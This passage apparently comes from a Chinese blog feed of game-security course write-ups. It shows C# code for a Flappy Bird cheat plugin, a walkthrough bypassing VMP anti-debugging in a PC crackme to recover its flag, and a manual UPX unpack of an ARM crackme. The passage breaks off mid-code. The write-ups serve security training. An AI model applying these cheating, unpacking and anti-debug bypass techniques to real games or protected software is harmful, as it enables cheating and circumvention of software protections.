class="hljs-keyword">value</span> == <span class="hljs-literal">true</span>)<br>    &#123;<br>        <span class="hljs-comment">// 关闭重力影响</span><br>        GlobalVariables.birdRigidbody2D.gravityScale = <span class="hljs-number">0f</span>;<br>        <span class="hljs-comment">// 速度向量设为0</span><br>        GlobalVariables.birdRigidbody2D.velocity = <span class="hljs-keyword">new</span> Vector2(<span class="hljs-number">0f</span>, <span class="hljs-number">0f</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-comment">// 恢复重力影响</span><br>        GlobalVariables.birdRigidbody2D.gravityScale = <span class="hljs-number">1f</span>;<br>    &#125;<br>    Debug.Log(<span class="hljs-string">$&quot;fly : <span class="hljs-subst">&#123;<span class="hljs-keyword">value</span>&#125;</span>&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>SetSocre</code>修改游戏分数，并刷新分数显示</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cs"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SetScore</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> <span class="hljs-keyword">value</span></span>)</span><br>&#123;<br>    <span class="hljs-comment">// 设置游戏分数</span><br>    GlobalVariables.birdInstances.score = <span class="hljs-keyword">value</span>;<br>    GamePlayController.instance.setScore(<span class="hljs-keyword">value</span>);<br>    Debug.Log(<span class="hljs-string">$&quot;set score  <span class="hljs-subst">&#123;<span class="hljs-keyword">value</span>&#125;</span>&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>SetSpeed</code>设置x方向移动速度，由于<code>forwardSpeed</code>是<code>BirdScripts</code>的私有成员，不能能够小鸟的实例来直接修改，需要使用反射机制修改</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cs"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SetSpeed</span>(<span class="hljs-params"><span class="hljs-built_in">float</span> <span class="hljs-keyword">value</span></span>)</span><br>&#123;<br>    <span class="hljs-comment">// 设置x轴速度</span><br>    GlobalVariables.speed.Value = <span class="hljs-keyword">value</span>;<br>    <span class="hljs-comment">// 私有成员需要使用反射修改</span><br>    FieldInfo privateField = <span class="hljs-keyword">typeof</span>(BirdScripts).GetField(<span class="hljs-string">&quot;forwardSpeed&quot;</span>, BindingFlags.NonPublic | BindingFlags.Instance);<br>    <span class="hljs-keyword">if</span> (privateField != <span class="hljs-literal">null</span>)<br>    &#123;<br>        privateField.SetValue(GlobalVariables.birdInstances, <span class="hljs-keyword">value</span>);<br>        Debug.Log(<span class="hljs-string">$&quot;forward speed : <span class="hljs-subst">&#123;<span class="hljs-keyword">value</span>&#125;</span>&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>BirdMove</code>将小鸟向指定方向移动</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cs"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">BirdMove</span>(<span class="hljs-params"><span class="hljs-built_in">float</span> x, <span class="hljs-built_in">float</span> y</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (GlobalVariables.birdInstances != <span class="hljs-literal">null</span>)<br>    &#123;<br>        Vector3 basePosition = GlobalVariables.birdInstances.transform.position;<br>        basePosition.x += x;<br>        basePosition.y += y;<br>        GlobalVariables.birdInstances.transform.position = basePosition;<br>        Debug.Log(<span class="hljs-string">$&quot;move bird x : <span class="hljs-subst">&#123;x&#125;</span>, y : <span class="hljs-subst">&#123;y&#125;</span>&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>FinishGame</code>触发游戏胜利，播放胜利音效</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cs"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">FinishGame</span>()</span><br>&#123;<br>    <span class="hljs-comment">// 游戏胜利</span><br>    <span class="hljs-keyword">if</span> (GlobalVariables.birdInstances != <span class="hljs-literal">null</span>)<br>    &#123;<br>        GlobalVariables.birdInstances.isAlive = <span class="hljs-literal">false</span>;<br>        <span class="hljs-comment">// 需要利用反射调用私有方法和获取私有变量</span><br>        FieldInfo cheerClipFiled = <span class="hljs-keyword">typeof</span>(BirdScripts).GetField(<span class="hljs-string">&quot;cheerClip&quot;</span>, BindingFlags.NonPublic | BindingFlags.Instance);<br>        AudioSource audioSource = GlobalVariables.birdInstances.GetComponent&lt;AudioSource&gt;();<br>        audioSource.PlayOneShot((AudioClip)cheerClipFiled.GetValue(GlobalVariables.birdInstances));<br>        GamePlayController.instance.finishGame();<br>        Debug.Log(<span class="hljs-string">&quot;finish game!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译插件得到<code>CheatPlugin.dll</code>，复制到plugins插件文件下启动游戏</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\workspace\腾讯菁英班\外挂实现分析<span class="hljs-literal">-PC</span>端\CheatPlugin&gt; dotnet build; <span class="hljs-built_in">cp</span> .\bin\Debug\net35\CheatPlugin.dll ..\FlappyBird_BepInEx\BepInEx\plugins\<br>MSBuild version <span class="hljs-number">17.3</span>.<span class="hljs-number">2</span>+<span class="hljs-number">561848881</span> <span class="hljs-keyword">for</span> .NET<br>  正在确定要还原的项目…<br>  所有项目均是最新的，无法还原。<br>  CheatPlugin -&gt; C:\workspace\腾讯菁英班\外挂实现分析<span class="hljs-literal">-PC</span>端\CheatPlugin\bin\Debug\net35\CheatPlugin.dll<br><br>已成功生成。<br>    <span class="hljs-number">0</span> 个警告<br>    <span class="hljs-number">0</span> 个错误<br><br>已用时间 <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00.69</span><br></code></pre></td></tr></table></figure><p>根据GUI提示，F1打开控制菜单，ESC暂停游戏，1&#x2F;2切换无敌，3&#x2F;4切换碰撞，5&#x2F;6切换飞行，9增加分数，0结束游戏，上下左右控制小鸟移动</p><p><img src="assets/2023-10-27-19-37-06-%E5%8A%9F%E8%83%BD%E6%BC%94%E7%A4%BA.gif"></p>]]></content>
    
    
    <categories>
      
      <category>腾讯游戏客户端安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>PC端VMP壳逆向分析</title>
    <link href="/2023/10/17/TencentGameClient/PC%E7%AB%AFVMP%E5%A3%B3%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    <url>/2023/10/17/TencentGameClient/PC%E7%AB%AFVMP%E5%A3%B3%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/noxke/TencentGameClientOpenCourse">GitHub - noxke&#x2F;TencentGameClientOpenCourse: 腾讯游戏客户端公开课2023 腾讯菁英班</a></p><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>运行<code>crackme2.exe</code>文件，熟悉的检测到虚拟机弹窗</p><img src="2023-10-17-00-11-03-image.png" title="" alt="" width="161"><p>大概率vmp加壳，使用<code>exeinfo</code>工具验证</p><img src="2023-10-17-00-11-58-image.png" title="" alt="" width="434"><p>确认是vmp加壳，<del>关闭环境，打开移动端题目分析</del></p><p>使用ida64打开程序确认加壳的部分</p><img src="2023-10-17-00-16-33-image.png" title="" alt="" width="583"><p>程序入口push call，典型的vmp特征，程序入口处加壳，无法静态定位到程序入口点，暂时不能确定是否对整个程序加壳，静态分析难度较大</p><h3 id="动态调试分析"><a href="#动态调试分析" class="headerlink" title="动态调试分析"></a>动态调试分析</h3><p>由于有vmp壳的存在，程序有虚拟机检测和调试器检测，使用ida绕过调试不方便，应此使用<a href="https://github.com/x64dbg/x64dbg">x64dbg</a>进行调试分析</p><p>反调试屏蔽插件<code>ScyllaHide</code>设置如下</p><img title="" src="2023-10-17-00-24-44-image.png" alt="" width="461"><p>调试器运行程序，第一次会在程序入口点断下</p><p><img src="2023-10-17-00-29-45-image.png"></p><p>此处为vmp入口点，继续运行程序</p><p><img src="2023-10-17-00-31-19-image.png"></p><p>程序会在上图三处<code>nop</code>指令处断下，直接继续运行，如果反调试屏蔽正常，程序将进入运行状态</p><p><img src="2023-10-17-00-32-47-image.png"></p><p>等待输入状态中，随意输入并回车后（两次回车），程序继续运行，几秒钟后程序关闭，和没有调试器运行时状态一致，因此已经绕过程序的反调试</p><p>由于不确定程序的逻辑部分是否加壳，通过API调用栈回溯的方式找到API调用代码</p><p>对可能的输入输出API下断点</p><ul><li><p>kernel32.ReadConsoleW</p></li><li><p>kernel32.ReadFile</p></li><li><p>kernel32.WriteConsoleW</p></li><li><p>kernel32.WriteConsoleA</p></li><li><p>kernel32.WriteFile</p></li></ul><p><img src="2023-10-17-00-38-15-image.png"></p><p>重新调试运行程序，跳过几个检测断点后，进程在<code>kernel32.WriteFile</code>断下，查看参数寄存器</p><img src="2023-10-17-00-40-35-image.png" title="" alt="" width="349"><p>rcx为文件句柄，rdx为输出缓冲区，r8为输出字节长度，其他参数此处忽略</p><p>输出字符串为<code>请输入flag:\r\n\r</code>，正好为程序的输出提示，因此可以确认程序的输入输出分别使用<code>ReadFile</code>和<code>WriteFile</code>实现，关闭其他断点</p><p>查看调用堆栈</p><p><img src="2023-10-17-00-46-06-image.png"></p><p>堆栈调用过多，逐层返回分析</p><img src="2023-10-17-00-49-21-image.png" title="" alt="" width="508"><p>当进程返回到<code>0x140298DF8</code>地址处时，继续Ctrl+F9后程序在<code>ReadFile</code>断下，因此程序的输出逻辑应该在<code>0x140298DF8</code>附近</p><img src="2023-10-17-00-50-27-image.png" title="" alt="" width="629"><p>断下位置应该是程序的输入位置，与输出时的回溯相同，查看调用堆栈，逐层返回分析</p><p>返回到如下位置，与上述的输出提示字符串位置接近</p><p><img src="2023-10-17-00-56-33-image.png"></p><p>查看进程堆栈</p><img src="2023-10-17-00-59-12-image.png" title="" alt="" width="511"><p>输入的字符串地址储存在堆栈中，还观察到有格式化字符串<code>&quot;%s&quot;</code>存在，因此猜测次数为格式化输入函数调用</p><p>因此可以确认<code>0x140298E12</code>为输出提示字符串位置，<code>0x140298E12</code>为输入字符串位置，此时能够确定程序的逻辑部分未被vmp加壳，可以继续后续的动态调试分析</p><p>回溯堆栈确定程序的入口点</p><p><img src="2023-10-17-01-01-50-image.png"></p><p>观察到用户层只有两层调用，因此当前层的上一层为程序的入口点位置</p><p><img src="2023-10-17-01-02-53-image.png"></p><p>此时可确认程序的入口点OEP为<code>0x140001510</code>，下断点，主函数为<code>0x1400010C0</code>，输出提示字符串位置为<code>0x140298DF3</code>，输入字符传位置为<code>0x140298E0D</code>，对这几个地址下断点，重新调试运行程序，跳过检测断点后，进程在OEP断下</p><p><img src="2023-10-17-01-06-44-image.png"></p><p>继续运行，程序在主函数入口点断下</p><p><img src="2023-10-17-01-07-46-image.png"></p><p>继续运行，程序在输处提示字符串处断下</p><p><img src="2023-10-17-01-08-30-image.png"></p><p>查看参数寄存器</p><img src="2023-10-17-01-09-07-image.png" title="" alt="" width="327"><p>只有rcx一个参数，为<code>请输入flag:\n\r</code>，因此该处调用的函数为<code>puts</code>，后续程序输出时可能还会调用该函数，对函数内下断点</p><p>继续运行到输入字符串位置处断下</p><p><img src="2023-10-17-01-14-43-image.png"></p><p>查看参数寄存器</p><img src="2023-10-17-01-15-10-image.png" title="" alt="" width="343"><p>有两个参数，rcx为格式化字符串<code>&quot;%s&quot;</code>，rdx为地址<code>0x14FE30</code>，因此该处调用函数为<code>printf</code>，<code>0x14FE30</code>为输入缓冲区</p><p>继续运行到<code>printf</code>返回处，查看输入缓冲区<code>0x14FE30</code>处内存</p><p><img src="2023-10-17-01-19-20-image.png"></p><p>此处内存为输入的字符串</p><p>上述操作完成了程序输入和输出的定位，接下来定位程序的校验部分以及结果输出部分</p><p>按<code>G</code>键切换到控制流视图</p><p><a href="./cfg.png">cfg.png</a></p><p>其中的xmm寄存器操作部分可直接跳过，直接查看主函数结尾位置</p><p><img src="2023-10-17-01-27-50-image.png"></p><p>一个分支跳转到程序结尾处，调用<code>sleep</code>等待5000ms显示结果，分支内调用<code>puts</code>函数，根据运行分析可知，当输入字符串时，程序不会输出反馈，输入几秒钟后程序停止，此逻辑正好对于该处代码，因此该代码块的上面应该为校验部分</p><p><img src="2023-10-17-01-31-41-image.png"></p><p>此处明显的串比较特征，从<code>[rax]</code>和<code>[rax+r8]</code>分别取出一个字节进行比较，结束比较的条件为两个字节不相等，或者<code>[rax+r8]</code>处取出的字节为0</p><p>对此处代码下断点，运行程序到该处断下，查看<code>rax</code>、<code>rax+r8</code></p><img src="2023-10-17-01-36-59-image.png" title="" alt="" width="399"><p>rax的值为<code>0x14FE30</code>，与<code>scanf</code>输入的字符串位置相同，字符串仍为输入字符串<code>helloNoxke</code></p><p><img src="2023-10-17-01-39-01-image.png"></p><p>rax+r8的值为<code>0x14FE35</code>，内容为字符串<code>jZiBUViF0WUYwISp4qjx5YwucMNGpb4g</code></p><p>因此该处比较输入字符串与<code>jZiBUViF0WUYwISp4qjx5YwucMNGpb4g</code>是否相等，程序flag为<code>jZiBUViF0WUYwISp4qjx5YwucMNGpb4g</code></p><p>运行程序验证</p><p><img src="2023-10-17-01-43-44-image.png"></p><p>得到正确的程序flag</p>]]></content>
    
    
    <categories>
      
      <category>腾讯游戏客户端安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>移动端脱壳分析</title>
    <link href="/2023/10/16/TencentGameClient/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E8%84%B1%E5%A3%B3%E5%88%86%E6%9E%90/"/>
    <url>/2023/10/16/TencentGameClient/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E8%84%B1%E5%A3%B3%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/noxke/TencentGameClientOpenCourse">GitHub - noxke&#x2F;TencentGameClientOpenCourse: 腾讯游戏客户端公开课2023 腾讯菁英班</a></p><h3 id="DUMP脱壳"><a href="#DUMP脱壳" class="headerlink" title="DUMP脱壳"></a>DUMP脱壳</h3><p>拿到附件先file一下</p><p><img src="2023-10-16-00-53-49-image.png"></p><p>arm平台的ELF文件，因此运行和调试使用手机进行（不需要root）</p><p>ida32打开<code>CrackMe2</code>，进行静态分析</p><img title="" src="2023-10-16-00-57-58-image.png" alt="" data-align="center" width="222"><p>ida只识别出了几个函数，一眼壳，Shift+F12查看字符串，upx加壳</p><img src="2023-10-16-00-59-15-image.png" title="" alt="" width="575"><p>下载upx尝试使用<code>upx -d</code>脱壳</p><img title="" src="2023-10-16-01-00-45-image.png" alt="" width="537"><p>脱不下来，猜测upx特征被隐藏了，因此进行手动脱壳</p><p>先将<code>CrackMe2</code>push到手机，运行测试</p><img src="2023-10-16-01-05-26-image.png" title="" alt="" width="534"><p>程序在等待输入状态，此时upx已经完成解压缩，直接dump内存</p><p>启动idaserver，ida连接idaserver并附加调试</p><img title="" src="2023-10-16-01-07-40-image.png" alt="" width="427"><p>进程在read系统调用断下，根据LR寄存器定位返回地址，下断点，F9恢复进程运行</p><img src="2023-10-16-01-13-41-image.png" title="" alt="" width="426"><p>程序中随意输入字符串<code>1234567890</code>后回车，进程在断点出断下</p><img src="2023-10-16-01-14-23-image.png" title="" alt="" width="424"><p>使用Ctrl+F7运行到返回，直到PC离开libc.so内存空间，函数返回情况如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">syscall_read -&gt; __sread -&gt; __srefill -&gt; __srget -&gt; getc -&gt; debug005+<span class="hljs-number">0x9E64</span><br></code></pre></td></tr></table></figure><img src="2023-10-16-01-19-53-image.png" title="" alt="" width="419"><p>PC离开libc.so内存空间后，返回到debug005段中，因此该段为upx解压之后的可执行段，使用OllyDump插件dump该段内存，选择debug005段</p><img title="" src="2023-10-16-01-25-02-image.png" alt="" width="491"><p>OllyDump自动识别了入口点<code>0x5358</code>，以及存在关联的段，所有参数保持默认，dump为<code>Crackme2_dump.so</code></p><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>使用ida32打开<code>Crackme2_dump.so</code>，自动识别出程序入口点<code>start</code>和主函数<code>main</code></p><img src="2023-10-16-07-44-51-image.png" title="" alt="" width="497"><img title="" src="2023-10-16-07-46-21-image.png" alt="" width="493"><p>在main函数中，显然0x6E2C处为输出提示字符串，Shift+F12查看字符串，定位到如下可能有用的字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">LOAD:<span class="hljs-number">00048000</span> aCatProcNetTcpG DCB <span class="hljs-string">&quot;cat /proc/net/tcp |grep :5D8A&quot;</span>,<span class="hljs-number">0</span><br>LOAD:<span class="hljs-number">0004801</span>E aR DCB <span class="hljs-string">&quot;r&quot;</span>,<span class="hljs-number">0</span><br>LOAD:<span class="hljs-number">00048020</span> aProcDStatus DCB <span class="hljs-string">&quot;/proc/%d/status&quot;</span>,<span class="hljs-number">0</span><br>LOAD:<span class="hljs-number">00048030</span> aTracerpid DCB <span class="hljs-string">&quot;TracerPid&quot;</span>,<span class="hljs-number">0</span><br>LOAD:<span class="hljs-number">0004803</span>A aUndebug DCB <span class="hljs-string">&quot;undebug&quot;</span>,<span class="hljs-number">0xA</span>,<span class="hljs-number">0</span><br>LOAD:<span class="hljs-number">00048050</span> aDmd2vxkydlvezu DCB <span class="hljs-string">&quot;DMD2vxKYDLvezuriqND2DhP3BJfdtuWWrxe9pq==&quot;</span>,<span class="hljs-number">0</span><br>LOAD:<span class="hljs-number">00048079</span> aWrongAnswer DCB <span class="hljs-string">&quot;Wrong Answer&quot;</span>,<span class="hljs-number">0xA</span>,<span class="hljs-number">0</span><br>LOAD:<span class="hljs-number">00048090</span> aInputYourAnswe DCB <span class="hljs-string">&quot;Input Your Answer:&quot;</span>,<span class="hljs-number">0xA</span>,<span class="hljs-number">0</span><br>LOAD:<span class="hljs-number">000480B</span>0 aJustForKidding DCB <span class="hljs-string">&quot;just for kidding&quot;</span>,<span class="hljs-number">0</span><br>LOAD:<span class="hljs-number">00048120</span> aAbcdefghijklmn DCB <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>,<span class="hljs-number">0</span><br>LOAD:<span class="hljs-number">00048140</span> aAbcdefghijklmn_0 DCB <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>,<span class="hljs-number">0</span><br>LOAD:<span class="hljs-number">00048160</span> a0123456789 DCB <span class="hljs-string">&quot;0123456789+/&quot;</span>,<span class="hljs-number">0</span><br>LOAD:<span class="hljs-number">0004816</span>D aTrueAnswer DCB <span class="hljs-string">&quot;True Answer&quot;</span>,<span class="hljs-number">0</span><br>LOAD:<span class="hljs-number">00048179</span> aWrongAnswer_0 DCB <span class="hljs-string">&quot;Wrong Answer&quot;</span>,<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h5 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h5><p>第一个可疑字符串<code>cat /proc/net/tcp |grep :5D8A</code>查看当前的TCP连接情况，<code>0x5D8A</code>转换为十进制为<code>23946</code>，idaserver的默认调试端口，因此此处为检查端口的反调试，查看交叉引用定位到反调试代码</p><p>定位到反调试函数的地址为<code>0x53F4</code>，命名为<code>undebug1</code></p><p>第二个可疑字符串<code>/proc/%d/status</code>，查看进程的状态，根据后续的字符串<code>TracerPid</code>猜测该处是检查进程的<code>TracerPid</code>判断进程是否被调试，查看交叉引用定位到反调试代码</p><img src="2023-10-16-08-05-43-image.png" title="" alt="" width="453"><p>定位到反调试函数地址为<code>0x059D4</code>，命名为<code>undebug2</code></p><p>第三个字符串<code>undebug</code>，是检测到调试器时的输出字符串，查看交叉定位输出该字符串的位置</p><img src="2023-10-16-12-39-09-image.png" title="" alt="" width="455"><p>定位到函数地址为<code>0x5AD0</code>，命名为<code>undebug</code>，该函数调用<code>undebug1</code>和<code>undebug2</code>检测是否被调试，由于<code>undebuge1</code>和<code>undebug2</code>中均没有使程序终止的代码，因此检查调试的入口点为<code>undebug</code></p><h5 id="输入校验"><a href="#输入校验" class="headerlink" title="输入校验"></a>输入校验</h5><p>注意到字符串<code>DMD2vxKYDLvezuriqND2DhP3BJfdtuWWrxe9pq==</code>，典型的base64字符串，尝试解码但发现乱码，猜测解码后的数据为二进制数据或base64码表被替换</p><img src="2023-10-16-12-43-00-image.png" title="" alt="" width="458"><p><code>True Answer</code>应该是输入字符串正确时的输出，根据其交叉引用定位到输出该字符串的位置</p><p>定位到<code>0x7B50</code>函数处，将其命名位<code>check</code></p><img src="2023-10-16-12-53-49-image.png" title="" alt="" width="545"><p>两个分支分别输出<code>Wrong Answer</code>和<code>True Answer</code>，查看该函数的反编译代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs c">v6 = <span class="hljs-number">0</span>;<br>v52 = *(_DWORD *)off_47CE8;<br>*a1 = <span class="hljs-number">0</span>;<br>a1[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>a1[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> ( a3 )<br>&#123;<br>    LOBYTE(v41) = v46;<br>    LOBYTE(v7) = v45;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>    v8 = *a2++;<br>    --a3;<br>    *(&amp;v49 + v6++) = v8;<br>    <span class="hljs-keyword">if</span> ( v6 == <span class="hljs-number">3</span> )<br>    &#123;<br>        v9 = v49;<br>        v10 = v51 &amp; <span class="hljs-number">0x3F</span>;<br>        v11 = v50;<br>        v12 = (<span class="hljs-type">char</span> *)dword_48230;<br>        v13 = (v51 &gt;&gt; <span class="hljs-number">6</span>) &amp; <span class="hljs-number">0xFFFFFFC3</span> | (<span class="hljs-number">4</span> * (v50 &amp; <span class="hljs-number">0xF</span>));<br>        v47 = (v51 &gt;&gt; <span class="hljs-number">6</span>) &amp; <span class="hljs-number">0xC3</span> | (<span class="hljs-number">4</span> * (v50 &amp; <span class="hljs-number">0xF</span>));<br>        v48 = v51 &amp; <span class="hljs-number">0x3F</span>;<br>        <span class="hljs-keyword">if</span> ( (byte_48228 &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span> )<br>        v12 = algn_48229;<br>        v43 = a3;<br>        v42 = a2;<br>        sub_8430(a1, (<span class="hljs-type">unsigned</span> __int8)v12[v49 &gt;&gt; <span class="hljs-number">2</span>]);<br>        v14 = (<span class="hljs-type">char</span> *)dword_48230;<br>        <span class="hljs-keyword">if</span> ( (byte_48228 &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span> )<br>        v14 = algn_48229;<br>        v41 = (<span class="hljs-number">16</span> * v9) &amp; <span class="hljs-number">0x30</span> | (v11 &gt;&gt; <span class="hljs-number">4</span>);<br>        sub_8430(a1, (<span class="hljs-type">unsigned</span> __int8)v14[v41]);<br>        v15 = (<span class="hljs-type">char</span> *)dword_48230;<br>        <span class="hljs-keyword">if</span> ( (byte_48228 &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span> )<br>        v15 = algn_48229;<br>        sub_8430(a1, (<span class="hljs-type">unsigned</span> __int8)v15[v13]);<br>        v16 = (<span class="hljs-type">char</span> *)dword_48230;<br>        <span class="hljs-keyword">if</span> ( (byte_48228 &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span> )<br>        v16 = algn_48229;<br>        sub_8430(a1, (<span class="hljs-type">unsigned</span> __int8)v16[v10]);<br>        v7 = v9 &gt;&gt; <span class="hljs-number">2</span>;<br>        a2 = v42;<br>        v6 = <span class="hljs-number">0</span>;<br>        a3 = v43;<br>    &#125;<br>    &#125;<br>    <span class="hljs-keyword">while</span> ( a3 );<br>    v45 = v7;<br>    v46 = v41;<br>    <span class="hljs-keyword">if</span> ( v6 )<br>    &#123;<br>    <span class="hljs-keyword">if</span> ( v6 &lt;= <span class="hljs-number">2</span> )<br>        <span class="hljs-built_in">memset</span>(&amp;v49 + v6, <span class="hljs-number">0</span>, <span class="hljs-number">3</span> - v6);<br>    v45 = v49 &gt;&gt; <span class="hljs-number">2</span>;<br>    v46 = (<span class="hljs-number">16</span> * v49) &amp; <span class="hljs-number">0x30</span> | (v50 &gt;&gt; <span class="hljs-number">4</span>);<br>    v47 = (v51 &gt;&gt; <span class="hljs-number">6</span>) &amp; <span class="hljs-number">0xC3</span> | (<span class="hljs-number">4</span> * (v50 &amp; <span class="hljs-number">0xF</span>));<br>    v48 = v51 &amp; <span class="hljs-number">0x3F</span>;<br>    <span class="hljs-keyword">if</span> ( v6 &gt;= <span class="hljs-number">0</span> )<br>    &#123;<br>        v17 = (<span class="hljs-type">char</span> *)dword_48230;<br>        <span class="hljs-keyword">if</span> ( (byte_48228 &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span> )<br>        v17 = algn_48229;<br>        sub_8430(a1, (<span class="hljs-type">unsigned</span> __int8)v17[v49 &gt;&gt; <span class="hljs-number">2</span>]);<br>        v18 = v6;<br>        v19 = &amp;v46;<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>        v20 = (<span class="hljs-type">char</span> *)dword_48230;<br>        v22 = (<span class="hljs-type">unsigned</span> __int8)*v19++;<br>        v21 = v22;<br>        <span class="hljs-keyword">if</span> ( (byte_48228 &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span> )<br>            v20 = algn_48229;<br>        sub_8430(a1, (<span class="hljs-type">unsigned</span> __int8)v20[v21]);<br>        --v18;<br>        &#125;<br>        <span class="hljs-keyword">while</span> ( v18 );<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v6 &lt;= <span class="hljs-number">2</span> )<br>    &#123;<br>        v23 = <span class="hljs-number">3</span> - v6;<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>        sub_8430(a1, <span class="hljs-number">61</span>);<br>        